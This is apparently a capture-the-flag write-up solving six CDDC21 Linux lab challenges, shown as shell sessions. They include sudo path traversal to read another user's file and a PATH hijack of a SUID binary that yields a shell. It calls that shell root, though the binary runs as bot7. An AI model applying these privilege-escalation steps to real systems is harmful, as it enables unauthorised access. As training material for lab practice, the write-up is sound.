# Linux Rules the World! \(Linux\)

## Lock and Key

We are given a private RSA key file. We can use `ssh-keygen -p` to change the passphrase.

```text
root@no:~/Downloads# chmod 600 cybot01_bot1.key 
root@no:~/Downloads# ssh-keygen -p -f cybot01_bot1.key 
Key has comment 'bot1@ip-172-31-34-218'
Enter new passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved with the new passphrase.
```

```text
root@no:~/Downloads# ssh -i cybot01_bot1.key bot1@13.213.91.240
```

Once in, the flag is in the home directory.

`CDDC21{b0t_eNtR3nC3}`

## License to Run

The challenge description hinted at some malicious file that can be run. I looked for all the files that were executable by `bot2`, and found an interesting file in the home directory.

```text
bot2@cybot01:/$ find / -executable -type f 2>/dev/null | grep flag
/usr/src/linux-aws-headers-5.4.0-1045/tools/perf/trace/beauty/mount_flags.sh
/usr/src/linux-aws-headers-5.4.0-1045/tools/perf/trace/beauty/move_mount_flags.sh
/usr/src/linux-aws-headers-5.4.0-1045/tools/perf/trace/beauty/mmap_flags.sh
/usr/src/linux-aws-headers-5.4.0-1045/tools/perf/trace/beauty/rename_flags.sh
/usr/src/linux-aws-5.8-headers-5.8.0-1035/tools/perf/trace/beauty/mount_flags.sh
/usr/src/linux-aws-5.8-headers-5.8.0-1035/tools/perf/trace/beauty/move_mount_flags.sh
/usr/src/linux-aws-5.8-headers-5.8.0-1035/tools/perf/trace/beauty/mmap_flags.sh
/usr/src/linux-aws-5.8-headers-5.8.0-1035/tools/perf/trace/beauty/rename_flags.sh
/home/bot2/.#flag$!!1
```

Running this file gives us the flag.

```text
bot2@cybot01:~$ ./.#flag\$\!\!1 
CDDC21{TH4nKsF0R_p3RM}
```

## Historian

In the `.viminfo` file, a secret file location is revealed. The `/usr/local/share/secret` file contains the flag.

```text
bot3@cybot01:~$ ls -la
total 24
dr-xr-x---  2 root bot3 4096 Jun 18 09:51 .
drwxr-xr-x 10 root bot5 4096 Jun 18 09:51 ..
lrwxrwxrwx  1 root root    9 Jun 18 09:51 .bash_history -> /dev/null
-r--r-----  1 bot3 bot3  220 Feb 25  2020 .bash_logout
-r--r-----  1 bot3 bot3 3771 Feb 25  2020 .bashrc
-r--r-----  1 bot3 bot3  807 Feb 25  2020 .profile
-rwx------  1 bot3 root  794 Jun 23 10:34 .viminfo

bot3@cybot01:~$ cat .viminfo
...

# File marks:
'0  1  15  /usr/local/share/secret
4,48,1,15,1620820231,"/usr/local/share/secret'

...

bot3@cybot01:~$ cat /usr/local/share/secret
CDDC21{V1m_th3_s4vior}
```

## Line Inspection

There is a `random-secrets` file with lots of gibberish. Grepping the `CDDC` substring gives us the flag.

```text
bot4@cybot01:~$ cat random-secrets | grep CDDC
CDDC21{gRe3EpL1nG}
```

## Super

We are allowed to run `/usr/bin/cat /var/log/*` as bot6 with no password.

```text
bot5@cybot01:~$ sudo -l
Matching Defaults entries for bot5 on cybot01:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User bot5 may run the following commands on cybot01:
    (bot6 : bot6) NOPASSWD: /usr/bin/cat /var/log/*
```

We can use path traversal to get the flag:

```text
bot5@cybot01:~$ sudo -u bot6 cat /var/log/../../../home/bot5/flag.txt
CDDC21{b3w4r3sud03rz}
```

## Path to Win

There is a `systeminfo` binary in the home directory.

```text
bot6@cybot01:~$ ls -la
total 44
dr-xr-x---  2 root bot6  4096 Jun 18 09:51 .
drwxr-xr-x 10 root bot5  4096 Jun 18 09:51 ..
lrwxrwxrwx  1 root root     9 Jun 18 09:51 .bash_history -> /dev/null
-r--r-----  1 bot6 bot6   220 Feb 25  2020 .bash_logout
-r--r-----  1 bot6 bot6  3771 Feb 25  2020 .bashrc
-r--r-----  1 bot6 bot6   807 Feb 25  2020 .profile
-r--------  1 bot7 root    31 Jun 18 09:51 flag.txt
-r-sr-xr-x  1 bot7 root 17008 Jun 18 09:51 systeminfo
```

Running it gives the following output.

```text
bot6@cybot01:~$ ./systeminfo
System information...

[*] Date:
Wed Jun 23 15:06:18 UTC 2021

[*] Kernel:
5.8.0-1035-aws

[*] User infomation:
uid=1007(bot7) gid=1006(bot6) groups=1006(bot6),1005(bot5)
```

We can deduce that the `systeminfo` binary calls `id`. Note that since `systeminfo` has SUID permissions, it runs as `bot7`. If the `id` call does not use an absolute path, then we can perform PATH variable manipulation to force the execution of our custom payload.

This time, running `systeminfo` gives us a shell as root.

```text
bot6@cybot01:~$ cd /tmp
bot6@cybot01:/tmp$ echo /bin/sh > id
bot6@cybot01:/tmp$ chmod 777 id
bot6@cybot01:/tmp$ export PATH=/tmp:$PATH
bot6@cybot01:/tmp$ /home/bot6/systeminfo
System information...

[*] Date:
Wed Jun 23 15:07:48 UTC 2021

[*] Kernel:
5.8.0-1035-aws

[*] User infomation:
$ pwd
/tmp
$ cd /home/bot6
$ cat flag.txt
CDDC21{SU!d_!s_Qu!Te_DngeRouS}
```

